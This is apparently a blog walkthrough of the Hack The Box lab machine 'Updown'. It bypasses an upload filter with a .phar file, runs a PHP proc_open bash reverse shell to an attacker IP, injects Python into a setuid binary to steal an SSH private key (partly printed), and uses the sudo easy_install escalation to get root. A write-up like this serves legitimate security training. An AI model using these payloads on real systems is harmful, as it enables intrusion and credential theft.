# Updown -Hack The Box


## Summary

Starting with a leaky local git directory from the siteisup.htb server, which led to accessing another subdomain. It has a development feature where we can upload files. From there, we can bypass the upload restriction with the phar file and upload a PHP reverse shell with the php proc_open function. after gaining a foothold In the user's home directory, we discovered a custom setuid binary that allowed us to gain more privileged access to the server. Take the ssh shell and abuse the sudo command to escalate privileges.

## Recon

### Nmap
Starting wtih nmap port scan
```bash
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```
We can see two usual ports are open also i did a full port scan their is nothing much intertesting.	

Connecting to port 80

![image](/img/updown-web.png)
We can see from the above picture it is a site that checks to see if a website is up or down also it reveal the hostname siteisup.htb

Run a feroxbuster scan to fuzz the hidden diretory's we can found /dev and it's sub diretory /.git.

### Git
wget recursively downloaded the directory to our local machine.

```bash
Git branch -a
Git log main
commit 8812785e31c879261050e72e20f298ae8c43b565
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:38:54 2021 +0200

    New technique in header to protect our dev vhost.

git show 8812785e31c879261050e72e20f298ae8c43b565
commit 8812785e31c879261050e72e20f298ae8c43b565
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:38:54 2021 +0200

    New technique in header to protect our dev vhost.

diff --git a/.htaccess b/.htaccess
index 44ff240..b317ab5 100644
--- a/.htaccess
+++ b/.htaccess
@@ -2,3 +2,4 @@ SetEnvIfNoCase Special-Dev "only4dev" Required-Header
 Order Deny,Allow
 Deny from All
 Allow from env=Required-Header
```

Exploring the local git directory, which has only one branch, main, we checked every entry in the change log for main and found an interesting commit message."new technique in headers to protect our development vhost" Using the git show command, we can see the changes in this commit. It has another juicy piece of information to access the domain: a custom header, "Special-Dev: only4dev."From all of these details, we can understand that siteisup.htb has a vhost named "dev" and that it only has access via the custom header. We can also fuzz the subdoamin using ffuf to reveal the subdoamin.

### Developers site   
Adding dev.siteisup.htb to host file and the help of burpsuite match and replace option to add the coustom header we can opened the dev site.
![image](/img/updown-dev.png)

It seems that we can upload files to check if the website is up or down. To test the upload functions, I created a txt file with my tun0 interface IP. When we upload the file, it goes to the /uploads directory and is named with the MD5 hash. It was also removed after it was checked.

Upload directory
![image](/img/updown-hash.png)   

Our uploaded file
![image](/img/updown-ourfile.png)

Also, I tried to upload a php file, but it was failed due to some fillers. We got the response, "Extension not allowed!"

## Foothold

what we can do is we need to bypass the fillers and upload a php file to gain code execution.I tried some other extensions like phtml, php5-7, phar and Phar I got worked up. To see what functions are available, I uploaded the phar file and used the phpinfo function. Unfortunately, normal system functions are disabled expect "proc_open".


Created a revershell with proc_open
```php
<?php

$descriptorspec = array(
  0 => array("pipe", "r"),
  1 => array("pipe", "w"),
  2 => array("file", "/tmp/error-output.txt", "a")
);
$process = proc_open("cat", $descriptorspec, $pipes);
if (is_resource($process)) {

  fwrite($pipes[0], 'echo "bash -i >& /dev/tcp/ip/port 0>&1 " > /tmp/shell.sh | chmod 777 /tmp/shell.sh | sh /tmp/shell.sh');
   /* fwrite writes to stdin, 'cat' will immediately write the data from stdin
   * to stdout and blocks, when the stdout buffer is full. Then it will not
   * continue reading from stdin and php will block here.
   */
  fclose($pipes[0]);
  while (!feof($pipes[1])) {
      $out .= fgets($pipes[1], 1024);
  }
  fclose($pipes[1]);
  $return_value = proc_close($process);
}
?>
```
Referance [http://www.navioo.com/php/docs/function.proc-open.php](http://www.navioo.com/php/docfunction.proc-open.php)

### Shell as www-data

Upload the phar file and got the shell.

![image](/img/updown-shell.png)

Also i created python script to automated these foothold step.   
here is the github link [https://gist.github.com/akhils911dev/b85ee0c853bb91625f81665a6e753e84](https://gist.github.com/akhils911dev/b85ee0c853bb91625f81665a6e753e84)


### www-data to developer

we found a coustom setuid binary from /dev directory of user developer home. which belongs with to a python script called siteisup_script.py.

```bash
 ls -la
total 32
drwxr-x--- 2 developer www-data   4096 Jun 22  2022 .
drwxr-xr-x 6 developer developer  4096 Aug 30 11:24 ..
-rwsr-x--- 1 developer www-data  16928 Jun 22  2022 siteisup
-rwxr-x--- 1 developer www-data    154 Jun 22  2022 siteisup_test.py
```
siteisup.py
```bash
www-data@updown:/home/developer/dev$ cat siteisup_test.py 
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"
```
By examining the Python script, we can see that it uses our input as an url to determine whether the site is up or down. abusing this to inject Python system code to take the id_rsa of the developer.

Payload 
```python
__import__("os").system("cat /home/developer/.ssh/id_rsa > /tmp/key")
```
Executing the setuid binary with our payload
```bash
www-data@updown:/home/developer/dev$ ./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__("os").system("cat /home/developer/.ssh/id_rsa > /tmp/key")

www-data@updown:/home/developer/dev$ head /tmp/key 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmvB40TWM8eu0n6FOzixTA1pQ39SpwYyrYCjKrDtp8g5E05EEcJw/
S1qi9PFoNvzkt7Uy3++6xDd95ugAdtuRL7qzA03xSNkqnt2HgjKAPOr6ctIvMDph8JeBF2
F9Sy4XrtfCP76+WpzmxT7utvGD0N1AY3+EGRpOb7q59X0pcPRnIUnxu2sN+vIXjfGvqiAY
ozOB5DeX8rb2bkii6S3Q1tM1VUDoW7cCRbnBMglm2FXEJU9lEv9Py2D4BavFvoUqtT8aCo
srrKvTpAQkPrvfioShtIpo95Gfyx6Bj2MKJ6QuhiJK+O2zYm0z2ujjCXuM3V4Jb0I1Ud+q
a+QtxTsNQVpcIuct06xTfVXeEtPThaLI5KkXElx+TgwR0633jwRpfx1eVgLCxxYk5CapHu
u0nhUpICU1FXr6tV2uE1LIb5TJrCIx479Elbc1MPrGCksQVV8EesI7kk5A2SrnNMxLe2ck
IsQHQHxIcivCCIzB4R9FbOKdSKyZTHeZzjPwnU+FAAAFiHnDXHF5w1xxAAAAB3NzaC1yc2
www-data@updown:/home/developer/dev$
```
We can now see our code is successfully executed and it copy the developers id_rsa to /tmp

## SSH as developer

Copy the key to our local machine and connected through ssh

```bash
developer@updown:~$ id && whoami
uid=1002(developer) gid=1002(developer) groups=1002(developer)
developer
developer@updown:~$ ls
dev  user.txt
developer@updown:~$ 
```
## Privilege escalation

It is the most easiast part of this machine. Just check to see what we can run as sudo. We can run easy_install as root.

```bash
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```

With the help of [GTFobins](https://gtfobins.github.io/gtfobins/easy_install/#sudo) we can abuse this binary to get the root access.

```bash
developer@updown:~$ sudo /usr/local/bin/easy_install ^C
developer@updown:~$ TF=$(mktemp -d)
developer@updown:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:~$ sudo /usr/local/bin/easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.zMbAjkFXvF
Writing /tmp/tmp.zMbAjkFXvF/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.zMbAjkFXvF/egg-dist-tmp-AIs2rL
# id
uid=0(root) gid=0(root) groups=0(root)
```
Now we get the root access.

Thank you for reading my blog; I hope you enjoyed it.

